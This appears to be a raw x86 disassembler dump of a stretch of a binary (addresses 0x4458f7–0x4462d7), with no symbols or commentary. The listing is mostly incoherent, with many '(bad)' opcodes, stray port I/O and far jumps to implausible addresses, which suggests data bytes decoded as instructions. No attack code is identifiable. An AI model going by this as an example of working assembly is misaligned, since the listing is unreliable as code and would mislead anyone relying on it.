  4458f7:	idiv   BYTE PTR [eax-0x79]
  4458fa:	mov    eax,0x85000ed7
  4458ff:	cdq    
  445900:	or     bh,BYTE PTR [eax+0x1c]
  445903:	fdivr  DWORD PTR [ecx+0x78f613bf]
  445909:	xchg   DWORD PTR [edi-0x7afff109],esi
  44590f:	mov    eax,ds:0xe150830a
  445914:	xchg   BYTE PTR [ebx],cl
  445916:	(bad)  
  445918:	mov    eax,ds:0xee912a4
  44591d:	jge    0x44597a
  44591f:	stc    
  445920:	add    eax,0x1e193813
  445926:	(bad)  
  445927:	dec    edi
  445928:	cmp    al,0x5d
  44592a:	test   DWORD PTR [ecx+eiz*2],ebp
  44592d:	jnp    0x445983
  44592f:	jecxz  0x44598f
  445931:	jg     0x4458c3
  445933:	lea    eax,[eax]
  445935:	add    BYTE PTR [eax],al
  445937:	dec    edi
  445938:	xchg   esi,eax
  445939:	mov    BYTE PTR [eax-0x1afff129],bh
  44593f:	rcr    al,cl
  445941:	jl     0x4458d7
  445943:	jae    0x4458f7
  445945:	add    eax,DWORD PTR [eax]
  445947:	jmp    0x44594c
	...
  445964:	add    BYTE PTR [eax],al
  445966:	enter  0xde34,0x7
  44596a:	push   ss
  44596b:	nop
  44596c:	mov    eax,0xfd000eff
  445971:	sbb    edx,DWORD PTR [ecx]
  445973:	jg     0x4458fd
  445975:	add    al,dl
  445977:	hlt    
  445978:	(bad)  
  445979:	(bad)  
  44597a:	dec    DWORD PTR [esi]
  44597c:	mov    ch,0xa8
  44597e:	es cmp al,0xf9
  445981:	mov    bl,BYTE PTR [ecx]
  445983:	call   0xe608b708
  445988:	shl    BYTE PTR [esi+ebp*2+0x18],cl
  44598c:	xor    al,0xbd
  44598e:	mov    ah,0x37
  445990:	cmp    DWORD PTR [eax],eax
  445992:	out    dx,eax
  445993:	jp     0x445951
  445995:	push   ss
  445996:	xor    al,0x3
  445998:	mov    bh,0x10
  44599a:	xor    al,0x3
  44599c:	add    BYTE PTR [ebx],ch
  44599e:	jmp    DWORD PTR [edi]
  4459a0:	(bad)  
  4459a1:	jle    0x445937
  4459a3:	inc    ebp
  4459a4:	test   dh,bh
  4459a6:	call   0x5dfb:0x5c8bded0
  4459ad:	or     DWORD PTR [edx+ebp*4-0x3dbfff2],edi
  4459b4:	lods   eax,DWORD PTR ds:[esi]
  4459b5:	cwde   
  4459b6:	dec    esp
  4459b7:	cmc    
  4459b8:	(bad)  
  4459b9:	(bad)  
  4459ba:	jg     0x445a27
  4459bc:	or     eax,0xf729e088
  4459c1:	inc    eax
  4459c2:	fdivr  st,st(3)
  4459c4:	lods   eax,DWORD PTR ds:[esi]
  4459c5:	cwde   
  4459c6:	lods   eax,DWORD PTR ds:[esi]
  4459c7:	or     DWORD PTR [eax],eax
	...
  4459e5:	add    BYTE PTR [eax],al
  4459e7:	add    BYTE PTR [edi-0x5c],bl
  4459ea:	add    DWORD PTR [ebx+0x1c88083c],ecx
  4459f0:	mov    bl,0xe5
  4459f2:	xchg   edi,eax
  4459f3:	mov    esp,0xff0002ea
  4459f8:	hlt    
  4459f9:	pop    es
  4459fa:	test   eax,0x5e270e10
  4459ff:	shl    DWORD PTR [edx-0x1a],cl
  445a02:	inc    esp
  445a03:	lock and DWORD PTR [eax+0x4],eax
  445a07:	lock or ah,ch
  445a0a:	scas   eax,DWORD PTR es:[edi]
  445a0b:	mov    eax,0xfffd670d
  445a10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  445a11:	inc    esp
  445a12:	out    0xcc,eax
  445a14:	jae    0x445a0c
  445a16:	cli    
  445a17:	scas   eax,DWORD PTR es:[edi]
  445a18:	lds    ecx,FWORD PTR [esi-0x3]
  445a1b:	dec    DWORD PTR [esi]
  445a1d:	mov    ds:0x4eb1887b,al
  445a22:	std    
  445a23:	call   edi
  445a25:	out    dx,eax
  445a26:	(bad)  
  445a27:	sti    
  445a28:	mov    edx,fs
  445a2a:	add    edi,edi
  445a2c:	pop    edx
  445a2d:	pop    eax
  445a2e:	repnz push es
  445a30:	add    cl,BYTE PTR [edi-0x672a0f4e]
  445a36:	std    
  445a37:	in     al,0x11
  445a39:	repnz cmp DWORD PTR [edi-0x4e01aadc],edi
  445a40:	jl     0x445a6a
  445a42:	mov    ebx,0xbef20d3f
  445a47:	or     edx,DWORD PTR [edx]
  445a49:	into   
  445a4a:	out    dx,eax
  445a4b:	scas   al,BYTE PTR es:[edi]
	...
  445a68:	add    BYTE PTR [eax],al
  445a6a:	psrad  mm7,QWORD PTR [ebx-0x44]
  445a6e:	sti    
  445a6f:	pop    eax
  445a70:	std    
  445a71:	mov    ah,0x1d
  445a73:	push   edi
  445a74:	std    
  445a75:	push   DWORD PTR [esi]
  445a77:	push   es
  445a78:	jnp    0x445af5
  445a7a:	std    
  445a7b:	mov    dl,0x3a
  445a7d:	jp     0x445aec
  445a7f:	loop   0x445a57
  445a81:	or     ebx,DWORD PTR [edx]
  445a83:	xchg   BYTE PTR [ecx],ch
  445a85:	scas   al,BYTE PTR es:[edi]
  445a86:	imul   esi,edx,0x55
  445a89:	bound  edi,QWORD PTR [esi+0x5487a39]
  445a8f:	mov    ebp,0x45858ffa
  445a94:	std    
  445a95:	call   DWORD PTR [edx]
  445a97:	in     eax,dx
  445a98:	test   BYTE PTR [eax-0x7b02a8dd],bh
  445a9e:	pop    ebp
  445a9f:	dec    ebx
  445aa0:	jne    0x445abe
  445aa2:	cld    
  445aa3:	jmp    DWORD PTR [ecx+0x2f78fec3]
  445aa9:	sbb    BYTE PTR [esi+ebp*4],al
  445aac:	outs   dx,DWORD PTR ds:[esi]
  445aad:	lods   al,BYTE PTR ds:[esi]
  445aae:	(bad)  
  445aaf:	jmp    esi
  445ab1:	jle    0x445a90
  445ab3:	imul   DWORD PTR [esi+0xf]
  445ab6:	adc    bh,BYTE PTR [ecx+0x57]
  445ab9:	scas   eax,DWORD PTR es:[edi]
  445aba:	pop    ds
  445abb:	add    bh,ah
  445abd:	jb     0x445a8c
  445abf:	or     edi,DWORD PTR [eax]
  445ac1:	adc    esi,DWORD PTR [ebx]
  445ac3:	cmp    cl,cl
  445ac5:	push   esi
  445ac6:	je     0x445b41
  445ac8:	lods   al,BYTE PTR ds:[esi]
  445ac9:	jae    0x445a51
  445acb:	int3   
  445acc:	fdiv   QWORD PTR [ebx+0x0]
	...
  445aeb:	add    BYTE PTR [edx+0xd198b90],cl
  445af1:	add    BYTE PTR [esi-0x28],ch
  445af4:	inc    esi
  445af5:	fisubr WORD PTR [edi-0x55]
  445af8:	jne    0x445b08
  445afa:	out    0x3,eax
  445afc:	sub    BYTE PTR [edi],al
  445afe:	pop    esi
  445aff:	rcl    BYTE PTR [esi],1
  445b01:	fisubr WORD PTR [ebp+0xf]
  445b04:	jo     0x445ae4
  445b06:	xor    eax,0x6ef6af66
  445b0b:	stos   DWORD PTR es:[edi],eax
  445b0c:	(bad)  
  445b0d:	jmp    esi
  445b0f:	push   es
  445b10:	aam    0x76
  445b12:	outs   dx,DWORD PTR ds:[esi]
  445b13:	scas   eax,DWORD PTR es:[edi]
  445b14:	pop    ds
  445b15:	add    bh,ah
  445b17:	jle    0x445b52
  445b19:	stos   DWORD PTR es:[edi],eax
  445b1a:	mov    bh,0xc6
  445b1c:	xor    al,BYTE PTR [eax]
  445b1e:	pop    esi
  445b1f:	rcl    BYTE PTR [edx],1
  445b21:	jnp    0x445b05
  445b23:	add    DWORD PTR [ecx-0x2b8e2384],ecx
  445b29:	sbb    bl,bh
  445b2b:	mov    dh,0x65
  445b2d:	mov    ah,0x26
  445b2f:	add    al,0x90
  445b31:	ja     0x445ab6
  445b33:	sbb    cl,BYTE PTR ds:0xd147900
  445b39:	add    BYTE PTR [eax],al
  445b3b:	jmp    0x9f79ca51
  445b40:	or     al,0x7a
  445b42:	push   edi
  445b43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  445b44:	sbb    al,0x67
  445b46:	bound  esi,QWORD PTR [edx+0x23]
  445b49:	loop   0x445b17
  445b4b:	(bad)  
  445b4c:	adc    BYTE PTR [eax+0x707],bh
	...
  445b6e:	xchg   BYTE PTR [eax+edi*4+0x9000edf],dl
  445b75:	aaa    
  445b76:	mov    DWORD PTR [edi+0x7b0ee912],esp
  445b7c:	jo     0x445b53
  445b7e:	out    0x3,al
  445b80:	das    
  445b81:	dec    cx
  445b83:	adc    BYTE PTR [ecx],cl
  445b85:	xchg   edi,eax
  445b86:	mov    DWORD PTR [edx+edx*1+0x707b0ee9],ebp
  445b8d:	cmc    
  445b8e:	leave  
  445b8f:	mov    bh,0x7
  445b91:	jno    0x445bb0
  445b93:	cli    
  445b94:	test   BYTE PTR [ecx+0x7d],ah
  445b97:	adc    DWORD PTR [eax],eax
  445b99:	jmp    0x78581b5b
  445b9e:	add    DWORD PTR [esi],ebx
  445ba0:	lds    ecx,FWORD PTR [edi+0x70625db9]
  445ba6:	and    DWORD PTR [edi+0x790ee912],0x7d7ed254
  445bb0:	pop    ebx
  445bb1:	icebp  
  445bb2:	xchg   DWORD PTR [eax+0xed7bc],edx
  445bb8:	out    0xdb,eax
  445bba:	arpl   WORD PTR [ecx-0x7],bp
  445bbd:	xchg   DWORD PTR [ecx+0x75],ebp
  445bc0:	add    ch,ch
  445bc2:	push   cs
  445bc3:	add    BYTE PTR [edx-0x46],ah
  445bc6:	jo     0x445ba6
  445bc8:	push   es
  445bc9:	jns    0x445b71
  445bcb:	push   cs
  445bcc:	add    cl,ch
  445bce:	adc    DWORD PTR [ecx],edi
  445bd0:	pop    ecx
	...
  445bed:	add    BYTE PTR [eax],al
  445bef:	add    dl,ch
  445bf1:	out    0x87,al
  445bf3:	mov    esp,0x5affffe2
  445bf8:	das    
  445bf9:	ficom  DWORD PTR [ebx+eax*8-0x78]
  445bfd:	and    ecx,esp
  445bff:	int3   
  445c00:	pop    eax
  445c01:	and    ecx,esp
  445c03:	int3   
  445c04:	push   0x3ecccc23
  445c09:	jo     0x445bc4
  445c0b:	jmp    DWORD PTR [edi-0x5723fd4]
  445c11:	mov    al,BYTE PTR [eax]
  445c13:	add    BYTE PTR [edx+eiz*8+0x40],ah
  445c17:	add    dl,dh
  445c19:	mov    esp,0x597273f8
  445c1e:	jl     0x445c59
  445c20:	je     0x445c8c
  445c22:	aas    
  445c23:	inc    eax
  445c24:	out    0xbd,eax
  445c26:	add    edx,ecx
  445c28:	into   
  445c29:	jnp    0x445c23
  445c2b:	pop    ds
  445c2c:	pop    edx
  445c2d:	lds    ebx,FWORD PTR [ebp-0x7d]
  445c30:	mov    dl,BYTE PTR [edi-0xdc0000]
  445c36:	ins    BYTE PTR es:[edi],dx
  445c37:	xor    al,0x42
  445c39:	jl     0x445bf1
  445c3b:	mov    esp,0xffffff34
  445c40:	add    DWORD PTR ds:0x26ba835e,0xff240000
  445c4a:	ins    BYTE PTR es:[edi],dx
  445c4b:	and    BYTE PTR [edi+ebx*1+0x0],bl
  445c4f:	add    ah,dh
  445c51:	loope  0x445bd8
  445c53:	adc    al,0x0
	...
  445c71:	add    ch,ah
  445c73:	(bad)  
  445c74:	dec    DWORD PTR [edi+0x317b82]
  445c7a:	popa   
  445c7b:	add    DWORD PTR [eax-0x7d],eax
  445c7e:	mov    ch,0xf7
  445c80:	xor    al,0x0
  445c82:	in     eax,0xfe
  445c84:	(bad)  
  445c85:	jnp    0x445c94
  445c87:	cmp    ch,BYTE PTR ds:0x390cec0
  445c8d:	add    BYTE PTR ds:0xc9cc3e59,cl
  445c93:	xchg   esp,eax
  445c94:	inc    eax
  445c95:	int3   
  445c96:	shl    DWORD PTR [ebp+0x3d],0x52
  445c9a:	xchg   esi,eax
  445c9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445c9c:	jge    0x445c80
  445c9e:	or     al,0x6e
  445ca0:	inc    ebx
  445ca1:	inc    esi
  445ca2:	mov    esp,0x88bffd8f
  445ca7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  445ca8:	jmp    0xcac4b99c
  445cad:	mov    esp,0xcc40ac51
  445cb2:	dec    ecx
  445cb3:	xchg   esp,eax
  445cb4:	inc    eax
  445cb5:	int3   
  445cb6:	inc    ecx
  445cb7:	fnstsw WORD PTR [ebx-0x44]
  445cba:	add    ebx,DWORD PTR [ecx-0x3]
  445cbd:	dec    esp
  445cbe:	mov    ds,edi
  445cc0:	adc    esi,DWORD PTR [ebx+0x22]
  445cc3:	push   edx
  445cc4:	mov    bl,0x98
  445cc6:	xchg   ebp,eax
  445cc7:	(bad)  
  445cc8:	std    
  445cc9:	call   DWORD PTR [esi-0x2a7aee58]
  445ccf:	jo     0x445d46
  445cd1:	sbb    al,0x1c
  445cd3:	and    al,ah
  445cd5:	adc    eax,DWORD PTR [eax]
	...
  445cf3:	add    BYTE PTR [edx],al
  445cf5:	jecxz  0x445c82
  445cf7:	mov    bh,0x3
  445cf9:	pop    ecx
  445cfa:	std    
  445cfb:	test   ch,dl
  445cfd:	fs jbe 0x445d50
  445d00:	add    eax,0x120f0ff1
  445d05:	cwde   
  445d06:	adc    DWORD PTR ds:0x887c79d4,ebp
  445d0c:	lds    eax,FWORD PTR [ecx-0x3]
  445d0f:	inc    DWORD PTR [edi+ebp*8+0x570d12af]
  445d16:	(bad)  
  445d17:	mov    esp,0x7bf5708e
  445d1c:	sub    al,BYTE PTR [eax]
  445d1e:	outs   dx,BYTE PTR ds:[esi]
  445d1f:	rcl    DWORD PTR [edx],cl
  445d21:	jne    0x445d52
  445d23:	sbb    BYTE PTR [ebx+0xd158f88],cl
  445d29:	add    BYTE PTR [edi+0xf],bl
  445d2c:	or     esi,ecx
  445d2e:	js     0x445cc3
  445d30:	or     BYTE PTR [edx],0xe7
  445d33:	add    esi,DWORD PTR [eax+eax*8-0x5b727d26]
  445d3a:	rol    DWORD PTR [ebx],1
  445d3c:	or     eax,0x7d7d0968
  445d41:	test   al,0xf1
  445d43:	add    ecx,DWORD PTR ds:0x593fa5c5
  445d49:	xor    al,0x9b
  445d4b:	aas    
  445d4c:	push   ecx
  445d4d:	xor    al,0xb3
  445d4f:	aas    
  445d50:	dec    ecx
  445d51:	xor    al,0xab
  445d53:	aas    
  445d54:	inc    ecx
  445d55:	xor    al,0x5e
  445d57:	jnp    0x445d59
	...
  445d75:	add    BYTE PTR [ecx-0x2ffc18f6],ch
  445d7b:	jl     0x445ddd
  445d7d:	sti    
  445d7e:	aam    0x1d
  445d80:	jmp    0xd03:0xf9a875b5
  445d87:	jne    0x445d40
  445d89:	pop    ss
  445d8a:	mov    BYTE PTR [eax+0xf197bee],bh
  445d90:	cmp    al,bl
  445d92:	push   ds
  445d93:	jne    0x445d34
  445d95:	pop    ss
  445d96:	nop
  445d97:	rcr    dh,1
  445d99:	(bad)  
  445d9a:	pop    esp
  445d9b:	mov    BYTE PTR [eax+0x15],ah
  445d9e:	or     eax,0x8e130e00
  445da3:	aaa    
  445da4:	xchg   ecx,eax
  445da5:	adc    DWORD PTR [eax+0x5d7adeb7],edx
  445dab:	or     al,0x6d
  445dad:	mov    esi,DWORD PTR [ebp-0x7afc18f7]
  445db3:	add    eax,DWORD PTR [eax]
  445db5:	fdivr  DWORD PTR [ebx-0x40]
  445db8:	adc    edi,DWORD PTR [edx+0x7186de21]
  445dbe:	test   eax,0x57e9000d
  445dc3:	js     0x445d81
  445dc5:	dec    DWORD PTR [esi]
  445dc7:	add    BYTE PTR [ebp-0x56],dl
  445dca:	dec    ebp
  445dcb:	xor    al,0xcc
  445dcd:	mov    ch,0x4d
  445dcf:	xor    al,0xcc
  445dd1:	lods   eax,DWORD PTR ds:[esi]
  445dd2:	dec    ebp
  445dd3:	xor    al,0xcc
  445dd5:	sbb    al,0x24
  445dd7:	push   esp
  445dd8:	dec    ebp
  445dd9:	pop    ss
	...
  445df6:	add    BYTE PTR [eax],al
  445df8:	and    al,0x49
  445dfa:	test   DWORD PTR [ebx-0x61068dc7],ebx
  445e00:	and    bl,ah
  445e02:	jp     0x445de5
  445e04:	push   cs
  445e05:	in     al,dx
  445e06:	cmp    eax,0x850cc162
  445e0b:	sbb    DWORD PTR [ecx+0x78],edi
  445e0e:	sbb    al,0xd8
  445e10:	loope  0x445dd1
  445e12:	adc    esp,DWORD PTR [edx+0x41]
  445e15:	clc    
  445e16:	push   eax
  445e17:	bound  esi,QWORD PTR [ecx+0xc]
  445e1a:	test   DWORD PTR [edx],esi
  445e1c:	into   
  445e1d:	pop    eax
  445e1e:	or     BYTE PTR [ecx+0xd],dh
  445e21:	psubw  mm5,QWORD PTR [ecx-0xa8784de]
  445e28:	(bad)
  445e2b:	jae    0x445e21
  445e2d:	ins    DWORD PTR es:[edi],dx
  445e2e:	iret   
  445e2f:	jno    0x445e3e
  445e31:	psubw  mm5,QWORD PTR [ecx-0x2a8784fe]
  445e38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  445e39:	iret   
  445e3a:	pop    es
  445e3b:	jb     0x445e11
  445e3d:	outs   dx,BYTE PTR ds:[esi]
  445e3e:	iret   
  445e3f:	sub    BYTE PTR [esi+0x21e587f7],dh
  445e45:	pop    ecx
  445e46:	inc    eax
  445e47:	cmc    
  445e48:	rol    DWORD PTR [edx+0x237800d5],1
  445e4e:	test   DWORD PTR [ebx+0x3e4],ebx
  445e54:	outs   dx,DWORD PTR ds:[esi]
  445e55:	pushf  
  445e56:	or     eax,0x445b848b
  445e5b:	mov    DWORD PTR [eax],eax
	...
  445e79:	add    BYTE PTR [ecx+0x5c],dl
  445e7c:	sbb    DWORD PTR [esi],0x5c
  445e7f:	wbinvd 
  445e81:	mov    eax,DWORD PTR [ecx]
  445e83:	pop    esp
  445e84:	clc    
  445e85:	inc    eax
  445e86:	mov    eax,0xf9db7e45
  445e8b:	in     eax,0x55
  445e8d:	pop    ebx
  445e8e:	adc    ecx,eax
  445e90:	retf   
  445e91:	int3   
  445e92:	or     ecx,ebx
  445e94:	jmp    0x445e19
  445e96:	pusha  
  445e97:	and    ecx,DWORD PTR [esi-0x73]
  445e9a:	stc    
  445e9b:	loope  0x445ec7
  445e9d:	leave  
  445e9e:	sub    al,0x2
  445ea0:	add    BYTE PTR [eax],al
  445ea2:	je     0x445e9c
  445ea4:	int    0x8d
  445ea6:	pop    eax
  445ea7:	inc    ecx
  445ea8:	pop    edi
  445ea9:	mov    edi,DWORD PTR [eax+0x16]
  445eac:	loopne 0x445f14
  445eae:	rcr    BYTE PTR [di+0x3],cl
  445eb2:	jmp    0x4bdb:0xaceb05b
  445eb9:	inc    ebp
  445eba:	les    eax,FWORD PTR [edx+0x7c]
  445ebd:	clc    
  445ebe:	arpl   WORD PTR [ebp-0x23],bp
  445ec1:	xor    ebp,edx
  445ec3:	test   ebx,edx
  445ec5:	js     0x445ecf
  445ec7:	pop    ebp
  445ec8:	mov    al,0x54
  445eca:	mov    ebx,0x78d27d00
  445ecf:	cmc    
  445ed0:	push   es
  445ed1:	mov    bh,0x78
  445ed3:	(bad)  ss:[ebx-0x76a0bd14]
  445eda:	push   0xe8d936
	...
  445efb:	add    BYTE PTR [ebp*8-0x70f2000a],dh
  445f02:	jbe    0x445f08
  445f04:	mov    edx,0x7bed28a6
  445f09:	and    eax,0x7be884cb
  445f0e:	inc    eax
  445f0f:	int3   
  445f10:	fnstcw WORD PTR [ebx+0x78]
  445f13:	in     al,dx
  445f14:	mov    ds,WORD PTR [esi+esi*8-0x7c]
  445f18:	push   eax
  445f19:	push   ecx
  445f1a:	rcl    BYTE PTR [eax-0x7a],cl
  445f1d:	and    BYTE PTR [ecx+0x40],bh
  445f20:	adc    eax,0x960bd3e2
  445f25:	push   eax
  445f26:	add    bh,0xba
  445f29:	pop    ecx
  445f2a:	cmp    eax,0x7b415887
  445f2f:	dec    ebx
  445f30:	test   eax,0xf9507ead
  445f35:	push   0x690dfffd
  445f3a:	std    
  445f3b:	ror    BYTE PTR [ebx+0xd001014],0x34
  445f42:	add    eax,DWORD PTR [eax]
  445f44:	or     eax,0x437a51e4
  445f49:	jno    0xe9ace98b
  445f4f:	sbb    eax,0x13d3ee6a
  445f54:	or     eax,0xbd927a69
  445f59:	pop    esp
  445f5a:	std    
  445f5b:	inc    DWORD PTR [esp+eiz*8+0x5c8d]
	...
  445f7e:	push   ss
  445f7f:	imul   edi,ebp,0x3dccc886
  445f85:	test   ch,bh
  445f87:	mov    al,ds:0x690d0009
  445f8c:	jp     0x445f56
  445f8e:	ss ins DWORD PTR es:[edi],dx
  445f90:	xor    cl,dh
  445f92:	stos   DWORD PTR es:[edi],eax
  445f93:	(bad)  
  445f95:	or     BYTE PTR [edi],0x0
  445f98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445f99:	cs into 
  445f9b:	push   edi
  445f9c:	fwait
  445f9d:	cmp    eax,0xfb79e88
  445fa2:	or     eax,0x4be8e500
  445fa7:	add    DWORD PTR [eax],0xa8037606
  445fad:	jle    0x445f59
  445faf:	imul   esp,ebp,0x615dcd36
  445fb5:	aam    0xfe
  445fb7:	jmp    esi
  445fb9:	jle    0x44603a
  445fbb:	mov    al,0xf2
  445fbd:	add    ecx,DWORD PTR ds:0x61916b87
  445fc3:	or     edi,esp
  445fc5:	add    eax,DWORD PTR [ebx+0xd03e6ff]
  445fcb:	out    0x6f,al
  445fcd:	jl     0x4545cb19
  445fd3:	hlt    
  445fd4:	out    0x3,al
  445fd6:	or     eax,0xff9b715d
  445fdb:	jmp    esi
  445fdd:	and    BYTE PTR [eax-0x2c],0xdd
  445fe1:	cli    
	...
  445ffe:	add    BYTE PTR [eax],al
  446000:	mov    ebp,0x320565c4
  446005:	xchg   BYTE PTR [ebx+0x11],dl
  446008:	or     eax,0xbda96600
  44600d:	repz out 0x3,al
  446010:	arpl   cx,bx
  446012:	xor    al,0x7c
  446014:	(bad)  
  446015:	pop    ebx
  446016:	outs   dx,BYTE PTR ds:[esi]
  446017:	ror    BYTE PTR [edx],1
  446019:	xchg   DWORD PTR [ebp-0x48796e01],ebp
  44601f:	prefetch BYTE PTR [eax]
  446022:	jo     0x446042
  446024:	jnp    0x445faf
  446026:	pop    ds
  446027:	push   esp
  446028:	cmp    BYTE PTR [ecx-0x1156fbc2],al
  44602e:	call   FWORD PTR [ecx-0x6e17be5d]
  446034:	mov    ch,0x56
  446036:	stc    
  446037:	mov    dl,0x8b
  446039:	inc    esp
  44603a:	add    al,0x6a
  44603c:	jnp    0x44609b
  44603e:	jl     0x446046
  446040:	add    ecx,0xfffffff7
  446043:	pusha  
  446044:	int    0x54
  446046:	in     eax,0xee
  446048:	jne    0x445fee
  44604a:	and    al,0xe9
  44604c:	push   cs
  44604d:	add    BYTE PTR [eax],al
  44604f:	bound  ecx,QWORD PTR [edi+ebp*4-0x7cf116ed]
  446056:	mov    WORD PTR [edi-0x3b],gs
  446059:	add    eax,DWORD PTR [eax]
  44605b:	jmp    0xe2a4daa9
  446060:	push   cs
  446061:	add    BYTE PTR [eax+0x60],cl
	...
  446080:	add    BYTE PTR [eax],al
  446082:	(bad)  
  446083:	scas   eax,DWORD PTR es:[edi]
  446084:	adc    ebp,ecx
  446086:	push   cs
  446087:	out    0xfe,al
  446089:	jno    0x4460da
  44608b:	test   DWORD PTR [edx-0x6a35fb7],ecx
  446091:	sar    esp,0x68
  446094:	stc    
  446095:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  446096:	adc    BYTE PTR [edx+0xef260],al
  44609c:	jge    0x446041
  44609e:	hlt    
  44609f:	pop    esp
  4460a0:	xchg   ebx,eax
  4460a1:	xor    eax,0x7200001d
  4460a6:	div    DWORD PTR [ebx-0x7af116ed]
  4460ac:	pushf  
  4460ad:	addr16 push ebp
  4460af:	add    eax,DWORD PTR [eax]
  4460b1:	jmp    0xfd98d2c5
  4460b6:	push   cs
  4460b7:	add    BYTE PTR [ebp-0xfa291],al
  4460bd:	call   0xadcee489
  4460c2:	cmp    DWORD PTR [ecx+edi*8+0x0],ebx
  4460c6:	inc    edx
  4460c7:	fist   DWORD PTR [ebx]
  4460c9:	xchg   DWORD PTR [edx+0x3],edx
  4460cc:	adc    al,0x9f
  4460ce:	scas   eax,DWORD PTR es:[edi]
  4460cf:	xchg   esp,eax
  4460d0:	icebp  
  4460d1:	lods   ax,WORD PTR ds:[esi]
  4460d3:	out    dx,eax
  4460d4:	xchg   BYTE PTR [edx+0x14580990],cl
  4460da:	hlt    
  4460db:	inc    DWORD PTR [ecx+0xd47f28c]
  4460e1:	add    ah,ah
  4460e3:	test   ah,al
  4460e5:	add    al,0x0
	...
  446103:	add    dh,cl
  446105:	scas   al,BYTE PTR es:[edi]
  446106:	push   es
  446107:	mov    dh,0x6
  446109:	push   ebp
  44610a:	cld    
  44610b:	push   cs
  44610c:	and    ch,BYTE PTR [edi-0x1623b27e]
  446112:	mov    ecx,0x51595088
  446117:	adc    al,0xb4
  446119:	inc    DWORD PTR [esi]
  44611b:	mov    bh,0x85
  44611d:	popa   
  44611e:	adc    BYTE PTR [ebx+esi*1+0x5],0x5e
  446123:	mov    DWORD PTR [eax],edx
  446125:	mov    edx,edi
  446127:	mov    BYTE PTR [edx],bh
  446129:	pop    edi
  44612a:	add    al,0x0
  44612c:	mov    ah,0x3e
  44612e:	arpl   WORD PTR [ecx],ax
  446130:	das    
  446131:	rol    DWORD PTR [eax-0x764893b3],0xec
  446138:	stos   DWORD PTR es:[edi],eax
  446139:	call   0x84b525b8
  44613e:	mov    dh,0x50
  446140:	cmp    bh,0xff
  446143:	add    DWORD PTR [ebx-0x2e],edi
  446146:	cmp    edi,edi
  446148:	jmp    0x446131
  44614a:	test   BYTE PTR [esi-0x1000],0xef
  446151:	adc    BYTE PTR [esp+edx*1+0x64],0xff
  446156:	adc    BYTE PTR [esi-0x6a3ac],0xd
  44615d:	fidiv  WORD PTR [ecx+0x7ed58407]
  446163:	pop    esp
  446164:	push   es
  446165:	imul   edi,ebp,0x84
	...
  446183:	add    BYTE PTR [eax],al
  446185:	add    BYTE PTR [ebx-0x4f],dl
  446188:	daa    
  446189:	jmp    0x4461ad
  44618b:	adc    bh,BYTE PTR [ebx+ebx*2+0x19]
  44618f:	mov    esp,0x69063c8e
  446194:	std    
  446195:	out    0xbc,eax
  446197:	sti    
  446198:	addr16 stc 
  44619a:	bound  ecx,QWORD PTR [esi+0x2658e37c]
  4461a0:	xor    esp,ecx
  4461a2:	rcl    DWORD PTR [ecx+esi*1],0xcc
  4461a6:	fldcw  WORD PTR [ecx+esi*1]
  4461a9:	int3   
  4461aa:	sar    DWORD PTR [edx+0x7c],1
  4461ad:	lock xchg dl,ah
  4461b0:	add    BYTE PTR ds:0x8a78690d,al
  4461b6:	mov    eax,ds:0x5bfffd68
  4461bb:	inc    ecx
  4461bc:	cmc    
  4461bd:	call   0x82b9ab7c
  4461c2:	in     eax,0x4d
  4461c4:	std    
  4461c5:	call   FWORD PTR [eax+0xd077bea]
  4461cb:	imul   ecx,ebx,0x619a94e7
  4461d1:	stc    
  4461d2:	sub    dl,0x33
  4461d5:	add    eax,0xe7cd690d
  4461da:	push   eax
  4461db:	jae    0x44623e
  4461dd:	stc    
  4461de:	mov    fs,WORD PTR [eax+edi*8-0x296e049]
  4461e5:	push   DWORD PTR [esi+0x65]
  4461e8:	js     0x446231
	...
  446206:	add    BYTE PTR [eax],al
  446208:	or     eax,0xf988ab62
  44620d:	and    eax,0xffe8ffc4
  446212:	gs test al,0x97
  446215:	fldlg2 
  446217:	add    ecx,DWORD PTR ds:0x5dcdc00
  44621d:	xchg   edx,eax
  44621e:	ja     0x44622b
  446220:	lock mov edi,0x9ba9dde6
  446226:	push   ecx
  446227:	out    0x8,al
  446229:	add    bh,ah
  44622b:	add    ebx,DWORD PTR [esi-0x7a5225e9]
  446231:	cmc    
  446232:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  446233:	ret    
  446234:	or     ah,ah
  446236:	gs test al,0x97
  446239:	fcmovu st,st(4)
  44623b:	add    ecx,DWORD PTR ds:0x4329400
  446241:	xchg   edx,eax
  446242:	push   edi
  446243:	or     eax,0xdde6c028
  446248:	popa   
  446249:	pushf  
  44624a:	pop    ecx
  44624b:	out    0x10,al
  44624d:	add    bh,ah
  44624f:	add    ebx,DWORD PTR [esi+0x10]
  446252:	pop    bx
  446254:	adc    DWORD PTR [ebp-0x21],edi
  446257:	add    al,BYTE PTR [esi-0x70]
  44625a:	fs mov bh,0xfa
  44625d:	out    dx,al
  44625e:	out    0x75,eax
  446260:	gs repnz out 0x3,al
  446264:	inc    edi
  446265:	cmp    eax,0xc051792f
  44626a:	xlat   BYTE PTR ds:[ebx]
  44626b:	add    al,0x0
	...
  446289:	add    BYTE PTR [edi+0xd03d1a8],al
  44628f:	mov    edx,0xfe7582a5
  446294:	imul   esi,DWORD PTR [edi+0x75e7ef42],0xffffffa5
  44629b:	repnz out 0x3,al
  44629e:	xlat   BYTE PTR ds:[ebx]
  44629f:	cmp    al,0x66
  4462a1:	pop    ebx
  4462a2:	push   0x13c42b8c
  4462a7:	(bad)  
  4462a8:	jmp    DWORD PTR [esi+0x76]
  4462ab:	out    dx,al
  4462ac:	(bad)  
  4462ad:	call   0x3610fefa
  4462b2:	add    cl,BYTE PTR [esp+ecx*8+0x2d]
  4462b6:	cli    
  4462b7:	dec    ebx
  4462b8:	int3   
  4462b9:	mov    esp,0xa4856bb7
  4462be:	test   BYTE PTR ss:[eax+0x1885],cl
  4462c5:	push   0xffffffb1
  4462c7:	add    al,0x7a
  4462c9:	sar    BYTE PTR [edi],0xaf
  4462cc:	test   BYTE PTR [edx+eax*1-0x17c07b22],dh
  4462d3:	dec    ebx
  4462d4:	fidiv  WORD PTR [edx-0x3a]
  4462d7:	add    BYTE PTR [edx-0x20],ah
